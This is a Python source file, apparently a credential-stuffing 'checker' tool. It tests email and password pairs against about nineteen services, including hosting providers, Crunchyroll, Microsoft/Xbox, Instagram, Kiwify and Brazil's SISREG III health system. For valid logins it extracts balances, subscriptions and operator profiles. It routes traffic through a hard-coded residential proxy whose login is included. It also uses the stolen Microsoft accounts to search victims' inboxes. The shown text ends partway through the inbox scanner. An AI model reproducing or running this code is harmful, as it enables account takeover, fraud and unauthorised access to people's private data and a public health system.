# checkers.py
import requests
import json
import re
import base64
import random
import string
import uuid
import time
import hashlib
import cloudscraper
from bs4 import BeautifulSoup
from urllib.parse import quote, urlparse, parse_qs

# Proxy residencial (usado em alguns)
RESIDENTIAL_PROXY = {
    "http": "http://user-yIyc0VqHxX5FuuCV-type-residential-country-BR:buhqFK6tFEocKZJc@geo.g-w.info:10080",
    "https": "http://user-yIyc0VqHxX5FuuCV-type-residential-country-BR:buhqFK6tFEocKZJc@geo.g-w.info:10080"
}

def format_date(iso_string):
    if not iso_string: return 'N/A'
    try:
        dt = datetime.strptime(iso_string.split('.')[0].replace('Z', ''), "%Y-%m-%dT%H:%M:%S")
        return dt.strftime("%d/%m/%Y")
    except Exception:
        return iso_string

# ==================== 1. TUBE-HOSTING ====================
def check_tubehosting(email, password):
    try:
        login_payload = {"mail": email, "password": password, "token": None, "device": {"name": "", "model": "chrome", "type": "WEB"}}
        res = requests.post('https://api.tube-hosting.com/login', json=login_payload, timeout=12)
        if res.status_code != 200: return False, "Login inválido", None
        data = res.json()
        access_token = data.get('accessToken')
        if not access_token: return False, "Sem token de acesso", None
        headers = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
        srv = requests.get('https://api.tube-hosting.com/servicegroups/currents?primaryOnly=false', headers=headers, timeout=12)
        saldo = f"R$ {data.get('userData', {}).get('balance', 0)/100:,.2f}"
        return True, f"Saldo: {saldo}", {"saldo": saldo}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 2. HOSTINI ====================
def check_hostini(email, password):
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36'}
    try:
        url = "https://hostini.io/index.php?rp=/login"
        r1 = session.get(url, headers=headers, timeout=15, verify=False)
        csrf = re.search(r"var csrfToken = '([^']+)'", r1.text)
        if not csrf: return False, "Falha no CSRF", None
        token = csrf.group(1)
        payload = {'token': token, 'username': email, 'password': password}
        r2 = session.post(url, data=payload, headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}, timeout=15, verify=False)
        if 'clientarea.php' in r2.url or 'logout' in r2.text.lower():
            r3 = session.get("https://hostini.io/clientarea.php", headers=headers, timeout=15, verify=False)
            soup = BeautifulSoup(r3.text, 'html.parser')
            servicos = orcamentos = "0"
            for tile in soup.find_all('div', class_='tile-title'):
                title = tile.get_text(strip=True).lower()
                stat = tile.find_previous_sibling('div', class_='tile-stat')
                if stat:
                    val = stat.get_text(strip=True)
                    if 'serviços' in title or 'services' in title: servicos = val
                    elif 'orçamentos' in title or 'quotes' in title: orcamentos = val
            return True, f"Serviços: {servicos} | Orçamentos: {orcamentos}", {"servicos": servicos, "orcamentos": orcamentos}
        return False, "Credenciais inválidas", None
    except Exception as e:
        return False, f"Erro: {e}", None
    finally:
        session.close()

# ==================== 3. HOSTBITS ====================
def check_hostbits(email, password):
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) Chrome/146.0.0.0 Mobile Safari/537.36'}
    try:
        url = "https://central.hostbits.com.br/index.php/login"
        r1 = session.get(url, headers=headers, timeout=15, verify=False)
        csrf = re.search(r"var csrfToken = '([^']+)'", r1.text)
        if not csrf: return False, "Falha no CSRF", None
        token = csrf.group(1)
        payload = {'token': token, 'username': email, 'password': password}
        r2 = session.post(url, data=payload, headers={**headers, 'Content-Type': 'application/x-www-form-urlencoded'}, timeout=15, verify=False)
        if 'clientarea.php' in r2.url or 'logout' in r2.text.lower():
            r3 = session.get("https://central.hostbits.com.br/clientarea.php", headers=headers, timeout=15, verify=False)
            soup = BeautifulSoup(r3.text, 'html.parser')
            servicos = dominios = faturas = "0"
            for tile in soup.find_all('div', class_='tile-title'):
                title = tile.get_text(strip=True).lower()
                stat = tile.find_previous_sibling('div', class_='tile-stat')
                if stat:
                    val = stat.get_text(strip=True)
                    if 'serviços' in title or 'services' in title: servicos = val
                    elif 'domínios' in title or 'domains' in title: dominios = val
                    elif 'faturas' in title or 'invoices' in title: faturas = val
            return True, f"Serviços: {servicos} | Domínios: {dominios} | Faturas: {faturas}", {"servicos": servicos, "dominios": dominios, "faturas": faturas}
        return False, "Credenciais inválidas", None
    except Exception as e:
        return False, f"Erro: {e}", None
    finally:
        session.close()

# ==================== 4. KING HOST ====================
def check_kinghost(email, password):
    try:
        device = "75e6f003e33568abf8d1ab1872795306"
        url = "https://authentication-service.kinghost.net/api/v1/login"
        payload = {"email": email, "password": password, "recaptcha": "", "logged": True, "device": device}
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) Chrome/147.0.7727.55 Mobile Safari/537.36', 'Content-Type': 'application/json'}
        res = requests.post(url, json=payload, headers=headers, timeout=15)
        if res.status_code == 200 and 'token' in res.text.lower():
            return True, "Autenticado com sucesso na King Host", None
        return False, "Credenciais inválidas", None
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 5. BOOSTEROID ====================
def check_boosteroid(email, password):
    session = requests.Session()
    login_url = "https://api.boosteroid.com/login"
    login_data = {"email": email, "password": password, "remember": False}
    login_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Content-Type": "application/json", "Accept": "application/json"}
    try:
        login_response = session.post(login_url, json=login_data, headers=login_headers, timeout=15)
        if login_response.status_code != 200:
            return False, "Credenciais inválidas", None
        j = login_response.json()
        access_token = j.get("access_token", "")
        if not access_token: return False, "Falha ao extrair Token", None
        sub_headers = login_headers.copy()
        sub_headers["Authorization"] = f"Bearer {access_token}"
        sub_res = session.get("https://api.boosteroid.com/user/subscription", headers=sub_headers, timeout=15)
        plan = "Free"
        amount = "0"
        status_sub = "Inactive"
        if sub_res.status_code == 200:
            sub_data = sub_res.json()
            if isinstance(sub_data, list) and len(sub_data) > 0:
                sub = sub_data[0]
                plan = sub.get("plan_name", sub.get("plan", "Free"))
                amount = str(sub.get("amount", sub.get("price", "0")))
                status_sub = sub.get("status", "Inactive")
        if plan != "Free" and status_sub == "Active":
            return True, f"Plano: {plan} | Valor: {amount}€ | Status: {status_sub}", {"plan": plan, "amount": amount, "status": status_sub}
        else:
            return True, f"Conta Free/Inativa - Plano: {plan}", {"plan": plan, "amount": amount, "status": status_sub}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 6. JOYARK ====================
def check_joyark(email, password):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) Chrome/138.0.0.0 Mobile Safari/537.36', 'Content-Type': 'application/json', 'channel-name': 'JoyArk_Web', 'platform': 'web'}
    try:
        res = requests.post('https://api.joyark.com/api/login', json={'email': email, 'password': password}, headers=headers, timeout=12)
        if res.status_code != 200: return False, "Login inválido", None
        tk = res.json().get('access_token')
        acc_headers = headers.copy()
        acc_headers['authorization'] = f'Bearer {tk}'
        acc = requests.get('https://api.joyark.com/api/accounts', headers=acc_headers, timeout=12).json()
        return True, f"Tempo total: {acc.get('duration', 0)} min", {"duration": acc.get('duration', 0)}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 7. ISEEK PRO ====================
def check_iseek(email, password):
    s = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    try:
        r1 = s.get("https://iseek.pro/login", headers=headers, timeout=15)
        token_match = re.search(r'name="_token" value="([^"]+)"', r1.text)
        if not token_match: return False, "Falha no CSRF", None
        tk = token_match.group(1)
        s.headers.update({"Referer": "https://iseek.pro/login"})
        r2 = s.post("https://iseek.pro/login", data={"_token": tk, "email": email, "password": password}, allow_redirects=False, timeout=15)
        loc = r2.headers.get("Location", "")
        if "login" in loc or not loc: return False, "Credenciais inválidas", None
        return True, f"Login bem-sucedido", {"location": loc}
    except Exception as e:
        return False, f"Erro: {e}", None
    finally:
        s.close()

# ==================== 8. INSTABRASIL ====================
def check_instabrasil(email, password):
    session = requests.Session()
    headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 14) Chrome/146.0.0.0 Mobile Safari/537.36", 'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 'Accept-Language': "pt-BR,pt;q=0.9"}
    try:
        r1 = session.get("https://paineldoinstabrasil.com/", headers=headers, timeout=15)
        csrf_match = re.search(r'name="_csrf" value="([^"]+)"', r1.text)
        if not csrf_match: return False, "Falha no CSRF", None
        csrf_token = csrf_match.group(1)
        post_headers = headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Origin'] = 'https://paineldoinstabrasil.com'
        payload = {'LoginForm[username]': email, 'LoginForm[password]': password, '_csrf': csrf_token}
        r2 = session.post("https://paineldoinstabrasil.com/", data=payload, headers=post_headers, timeout=15)
        if "class=\"dash_balance_text\"" not in r2.text and "Sair" not in r2.text:
            return False, "Credenciais inválidas", None
        saldo_match = re.search(r'<div class="dash_balance_text">Saldo atual</div>\s*<div class="dash_balance_value">R\$ ([^<]+)</div>', r2.text)
        gasto_match = re.search(r'<div class="dash_balance_text">Gasto total</div>\s*<div class="dash_balance_value">R\$ ([^<]+)</div>', r2.text)
        saldo = saldo_match.group(1).strip() if saldo_match else "0,00"
        gasto = gasto_match.group(1).strip() if gasto_match else "0,00"
        return True, f"Saldo: R$ {saldo} | Gasto: R$ {gasto}", {"saldo": saldo, "gasto": gasto}
    except Exception as e:
        return False, f"Erro: {e}", None
    finally:
        session.close()

# ==================== 9. NÚMERO VIRTUAL ====================
def check_virtual(email, password):
    try:
        scraper = cloudscraper.create_scraper()
        device_id = ''.join(random.choices('abcdef0123456789', k=16))
        headers = {'authority': 'app.meunumerovirtual.com', 'accept': '*/*', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10) Chrome/135.0.0.0 Mobile Safari/537.36', 'device-id': device_id}
        payload = {"email": email, "password": password, "token": None}
        res = scraper.post('https://app.meunumerovirtual.com/api/v2/user/auth', headers=headers, json=payload, timeout=20)
        if res.status_code != 200: return False, "Credenciais inválidas", None
        data = res.json()
        if data.get('error') != 0: return False, data.get('message', 'Erro'), None
        balance = data.get('some', {}).get('balance', 0.0) or data.get('user', {}).get('balance', 0.0)
        return True, f"Saldo: R$ {balance}", {"saldo": str(balance)}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 10. HUBSDEV ====================
def check_hubsdev(api_key):
    try:
        url = f"https://hubsdev.com/secret/check?key={quote(api_key)}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
        res = requests.get(url, headers=headers, timeout=15)
        data = res.json()
        if data.get("success") and data.get("validation", {}).get("valid"):
            info = data.get("key_info", {})
            return True, f"Plano: {info.get('plan_name', 'Unknown')} | Saldo: ${info.get('balance',0)} | Uso: {info.get('usage_today',0)}/{info.get('daily_limit',0)}", info
        else:
            return False, "Key inválida", None
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 11. CRUNCHYROLL ====================
def check_crunchyroll(email, password):
    session = requests.Session()
    device_id = str(uuid.uuid4())
    headers = {'host': 'beta-api.crunchyroll.com', 'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'}
    data = {'grant_type': 'password', 'username': email, 'password': password, 'scope': 'offline_access', 'client_id': 'y2arvjb0h0rgvtizlovy', 'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2', 'device_type': 'Baron', 'device_id': device_id}
    try:
        response = session.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=headers, data=data, timeout=15, proxies=RESIDENTIAL_PROXY)
        if '"access_token"' not in response.text:
            return False, "Credenciais inválidas", None
        token_data = response.json()
        access_token = token_data.get('access_token')
        auth_headers = {'authorization': f'Bearer {access_token}', 'user-agent': headers['user-agent']}
        me_res = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=auth_headers, timeout=15, proxies=RESIDENTIAL_PROXY)
        account_data = me_res.json()
        external_id = account_data.get('external_id')
        products_res = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=auth_headers, timeout=15, proxies=RESIDENTIAL_PROXY)
        products_data = products_res.json()
        plan = "Free"
        if 'items' in products_data and len(products_data['items']) > 0:
            plan = products_data['items'][0].get('product', {}).get('sku', 'Unknown')
        subs_res = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=auth_headers, timeout=15, proxies=RESIDENTIAL_PROXY)
        sub_data = subs_res.json()
        country = sub_data.get('country_code', 'US')
        return True, f"Plano: {plan} | País: {country}", {"plan": plan, "country": country}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 12. PRIVACY ====================
def check_privacy(email, password):
    try:
        useragent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/138.0.200.200 Safari/537.36"
        is_email = "@" in email
        payload = {"Email": f'"{email}"' if is_email else "null", "Document": "null" if is_email else f'"{email}"', "Password": f'"{password}"', "Locale": "pt-BR", "CanReceiveEmail": False}
        payload_str = json.dumps(payload)
        headers = {"authority": "service.privacy.com.br", "accept": "application/json, text/plain, */*", "content-type": "application/json", "origin": "https://privacy.com.br", "user-agent": useragent}
        session = requests.Session()
        res_login = session.post("https://service.privacy.com.br/auth/login", data=payload_str, headers=headers, proxies=RESIDENTIAL_PROXY, timeout=15, verify=False)
        if res_login.status_code != 200 or "token" not in res_login.text.lower():
            return False, "Credenciais inválidas", None
        token = res_login.json().get('token')
        auth_headers = headers.copy()
        auth_headers['authorization'] = f"Bearer {token}"
        del auth_headers['content-type']
        res_prof = session.get("https://service.privacy.com.br/profile/UserFollowing?page=0&limit=30&nickName=", headers=auth_headers, proxies=RESIDENTIAL_PROXY, timeout=15, verify=False)
        assinaturas = []
        if res_prof.status_code == 200:
            for item in res_prof.json():
                nome = item.get('profileName', '').strip()
                status = '[Free]' if item.get('isFree') else '[Pago]'
                if nome: assinaturas.append(f"{nome} {status}")
        return True, f"{len(assinaturas)} assinaturas", {"assinaturas": assinaturas}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 13. MICROSOFT (XBOX & MINECRAFT) ====================
def check_microsoft(email, password):
    session = requests.Session()
    session.verify = False
    try:
        # 1. Obter SFTAG
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        r = session.get(url, timeout=10)
        text = r.text
        ppft_match = re.search(r'value="([^"]+)"', text)
        if not ppft_match: return False, "Falha no SFTAG", None
        ppft = ppft_match.group(1)
        url_post_match = re.search(r'urlPost["\']?\s*:\s*["\']([^"\']+)["\']', text)
        if not url_post_match: return False, "Falha no URL Post", None
        url_post = url_post_match.group(1)
        # 2. Enviar login
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
        r2 = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        if '#' in r2.url:
            fragment = parse_qs(urlparse(r2.url).fragment)
            ms_token = fragment.get('access_token', [None])[0]
            if not ms_token: return False, "Falha ao obter token Microsoft", None
        else:
            return False, "Credenciais inválidas", None

        # 3. Xbox Auth
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        r3 = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
        if r3.status_code != 200: return False, "Falha Xbox Auth", None
        xbox_data = r3.json()
        xbox_token = xbox_data.get('Token')
        uhs = xbox_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs', '')
        if not xbox_token or not uhs: return False, "Falha XSTS", None

        # 4. XSTS
        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        r4 = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
        if r4.status_code != 200: return False, "Falha XSTS", None
        xsts_token = r4.json().get('Token')

        # 5. Minecraft token
        r5 = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
        if r5.status_code != 200: return False, "Falha Minecraft Token", None
        mc_token = r5.json().get('access_token')

        # 6. Perfil Minecraft
        r6 = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        mc_name = "N/A"
        if r6.status_code == 200:
            mc_name = r6.json().get('name', 'N/A')

        # 7. Entitlements
        r7 = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
        subs = "None"
        if r7.status_code == 200:
            text = r7.text
            if 'product_game_pass_ultimate' in text:
                subs = "Xbox Game Pass Ultimate"
            elif 'product_game_pass_premium' in text:
                subs = "Xbox Game Pass Premium"
            elif 'product_game_pass_essential' in text:
                subs = "Xbox Game Pass Essential"
            elif 'product_game_pass_pc' in text:
                subs = "Xbox Game Pass PC"
            elif 'product_minecraft' in text:
                subs = "Minecraft Java"

        return True, f"Xbox/Minecraft: {mc_name} | Subs: {subs}", {"mc_name": mc_name, "subs": subs}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 14. ROBLOX (via Hotmail) ====================
def check_roblox(email, password):
    session = requests.Session()
    try:
        # 1. Login Microsoft (mesmo fluxo que o checker Microsoft)
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + quote(email) + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K)", "x-ms-sso-ignore-sso": "1"}
        r1 = session.get(url, headers=headers, allow_redirects=True, timeout=15)
        text = r1.text
        ppft_match = re.search(r'name="PPFT" value="([^"]+)"', text)
        url_post_match = re.search(r'"urlPost":"([^"]+)"', text)
        if not ppft_match or not url_post_match: return False, "Falha na proteção MS", None
        ppft = ppft_match.group(1)
        url_post = url_post_match.group(1)
        data = f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1&passwd={quote(password)}&ps=2&PPFT={ppft}&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        r2 = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': r1.url}, allow_redirects=False, timeout=15)
        if "__Host-MSAAUTHP" not in session.cookies.get_dict(): return False, "Credenciais inválidas", None
        auth_code = ""
        if r2.status_code in [301, 302, 303]:
            loc = r2.headers.get('Location', '')
            if 'code=' in loc:
                auth_code = loc.split('code=')[1].split('&')[0]
        if not auth_code: return False, "Falha na autorização MS", None

        # 2. Token de acesso
        token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": auth_code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        r3 = session.post(token_url, data=token_data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=15)
        access_token = r3.json().get('access_token', '')
        if not access_token: return False, "Sem access token", None

        # 3. Pesquisar Roblox no inbox
        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        search_payload = {"Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7", "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25, "EnableTopResults": True, "TopResultsCount": 3}], "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"}
        search_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{session.cookies.get_dict().get('MSPCID','').upper()}", "Host": "substrate.office.com", "Content-Type": "application/json"}
        r4 = session.post(search_url, json=search_payload, headers=search_headers, timeout=15)
        if r4.status_code != 200: return False, "Erro na busca", None
        search_text = r4.text
        total_match = re.search(r'"Total":(\d+)', search_text)
        total = int(total_match.group(1)) if total_match else 0
        if total == 0: return False, "Nenhum email Roblox encontrado", None
        username_match = re.search(r'account:\s*([a-zA-Z0-9_]+)', search_text)
        if not username_match: return False, "Username não encontrado", None
        roblox_user = username_match.group(1)

        # 4. Obter dados do Roblox
        user_id_url = "https://users.roblox.com/v1/usernames/users"
        r5 = session.post(user_id_url, json={"usernames": [roblox_user], "excludeBannedUsers": False}, timeout=10, proxies=RESIDENTIAL_PROXY)
        if r5.status_code != 200: return False, "Falha ao obter ID Roblox", None
        user_id = r5.json()['data'][0]['id']
        user_url = f"https://users.roblox.com/v1/users/{user_id}"
        user_res = session.get(user_url, timeout=10, proxies=RESIDENTIAL_PROXY).json()
        friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
        friends_res = session.get(friends_url, timeout=10, proxies=RESIDENTIAL_PROXY).json()
        banned = "Yes" if user_res.get("isBanned", False) else "No"
        created = user_res.get("created", "").split("T")[0] if user_res.get("created") else "Unknown"
        friends = friends_res.get("count", 0)
        profile = f"https://www.roblox.com/users/{user_id}/profile"
        return True, f"Roblox: {roblox_user} | Friends: {friends} | Banned: {banned} | Created: {created}", {"roblox_user": roblox_user, "friends": friends, "banned": banned, "created": created, "profile": profile}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 15. KIWIFY ====================
def check_kiwify(email, password):
    try:
        url = "https://admin-api.kiwify.com.br/v1/handleAuth/login"
        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 'Accept': "application/json, text/plain, */*", 'content-type': "application/json;charset=UTF-8", 'origin': "https://dashboard.kiwify.com"}
        res = requests.post(url, json={"email": email, "password": password, "returnSecureToken": True}, headers=headers, timeout=15)
        if res.status_code != 200: return False, "Credenciais inválidas", None
        data = res.json()
        token = data.get("idToken")
        if not token: return False, "Falha na extração do token", None
        cursos = requests.get("https://admin-api.kiwify.com.br/v1/viewer/schools/courses", headers={'Authorization': f"Bearer {token}"}, params={"page": 1, "archived": "false"}, timeout=15).json().get("courses", [])
        nomes = [c["course_info"].get("name", "Desconhecido") for c in cursos if isinstance(c, dict) and "course_info" in c]
        profile = requests.get("https://admin-api.kiwify.com.br/v1/users/profile", headers={'Authorization': f"Bearer {token}"}, timeout=15).json()
        bloqueado = str(profile.get("blockedBalance", "0"))
        kiwipay = str(profile.get("availableBalance", "0"))
        return True, f"Cursos: {len(nomes)} | Saldo bloqueado: R$ {bloqueado} | Kiwipay: R$ {kiwipay}", {"cursos": nomes, "bloqueado": bloqueado, "kiwipay": kiwipay}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 16. DANKI CODE ====================
def check_danki(email, password):
    session = requests.Session()
    meu_ip = "127.0.0.1"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/147.0.0.0 Safari/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://cursos.dankicode.com"}
    payload = {"user": {"email": email, "password": password, "device_name": headers["User-Agent"], "ip": meu_ip}}
    try:
        resp = session.post("https://cursos.dankicode.com/api/user/login", headers=headers, json=payload, timeout=15)
        if resp.status_code != 200: return False, "Credenciais inválidas", None
        data = resp.json()
        token = data.get("token")
        if not token: return False, "Token não extraído", None
        headers["Authorization"] = f"Bearer {token}"
        camp_resp = session.get("https://cursos.dankicode.com/api/campus", headers=headers, timeout=15)
        cursos = []
        if camp_resp.status_code == 200:
            camp_data = camp_resp.json()
            if isinstance(camp_data, dict) and 'data' in camp_data:
                for item in camp_data['data']:
                    if 'course' in item and 'name' in item['course']:
                        cursos.append(item['course']['name'])
                    elif 'name' in item:
                        cursos.append(item['name'])
        return True, f"Cursos: {', '.join(cursos) if cursos else 'Nenhum'}", {"cursos": cursos}
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 17. SISREG III ====================
def check_sisreg(email, password):
    senha_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
    headers = {"Host": "sisregiii.saude.gov.br", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded"}
    dados = f"usuario={quote(email)}&senha=&senha_256={senha_hash}&etapa=ACESSO&logout="
    try:
        sessao = requests.Session()
        resposta = sessao.post("https://sisregiii.saude.gov.br/", data=dados, headers=headers, timeout=15, verify=False)
        res_text = resposta.text
        if "Login ou senha incorreto(s)." in res_text:
            return False, "Login ou senha incorretos", None
        if "Este operador foi desativado" in res_text:
            return False, "Operador desativado", None
        if "<p>Perfil</p>" in res_text:
            soup = BeautifulSoup(res_text, 'html.parser')
            detalhe = soup.find('div', {'id': 'detalheUsuario'})
            if detalhe:
                texto = detalhe.get_text(strip=True)
                operador = re.search(r'Operador:(.*?)Perfil:', texto).group(1).strip() if re.search(r'Operador:(.*?)Perfil:', texto) else "N/A"
                perfil = re.search(r'Perfil:(.*?)Unidade:', texto).group(1).strip() if re.search(r'Perfil:(.*?)Unidade:', texto) else "N/A"
                unidade = re.search(r'Unidade:(.*?)\(', texto).group(1).strip() if re.search(r'Unidade:(.*?)\(', texto) else "N/A"
                return True, f"Operador: {operador} | Perfil: {perfil} | Unidade: {unidade}", {"operador": operador, "perfil": perfil, "unidade": unidade}
        return False, "Falha no login", None
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 18. INSTAGRAM (API V1) ====================
def check_instagram(username, password):
    g1 = str(int(time.time()))
    g2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    g5, g6, g7, g9 = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    g8 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    headers = {
        'Host': 'i.instagram.com',
        'User-Agent': 'Instagram 240.2.0.18.107 Android (28/9; 239dpi; 720x1280; samsung; SM-N975F)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Ig-App-Id': '567067343352427',
        'X-Ig-Device-Id': g7,
        'X-Ig-Android-Id': g8,
        'X-Ig-Family-Device-Id': g5,
        'X-Pigeon-Session-Id': g9,
    }
    data = {
        'signed_body': f'SIGNATURE.{{"jazoest":"{g2}","country_codes":"[{{\\"country_code\\":\\"1\\"}}]","phone_id":"{g5}","enc_password":"#PWD_INSTAGRAM:0:{g1}:{password}","username":"{username}","adid":"{g6}","guid":"{g7}","device_id":"{g8}","login_attempt_count":"1"}}'
    }
    try:
        res = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, timeout=15)
        if res.status_code == 200 and '"logged_in_user"' in res.text:
            return True, "Logado com sucesso", None
        if any(x in res.text for x in ['two_factor_required', 'challenge_required']):
            return True, "2FA / Verificação necessária", None
        return False, "Credenciais inválidas", None
    except Exception as e:
        return False, f"Erro: {e}", None

# ==================== 19. HOTMAIL INBOX SCANNER ====================
def check_hotmail(email, password, keyword="Netflix"):
    session = requests.Session()
    session.verify = False
    UUID = str(uuid.uuid4())
    try:
        # 1. Obter PPFT e urlPost
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": UUID, "X-Office-Application": "145", "User-Agent": "Dalvik/2.1.0"}
        r1 = session.get(url1, headers=headers1, timeout=12)
        if "MSAccount" not in r1.text:
            return False, "Não é uma conta Microsoft válida", None
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        headers2 = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0", "x-ms-sso-ignore-sso": "1", "correlation-id": UUID}
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
        text2 = r2.text
        url_post = re.search(r'urlPost["\']?\s*:\s*["\']([^"\']+)["\']', text2)
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text2)
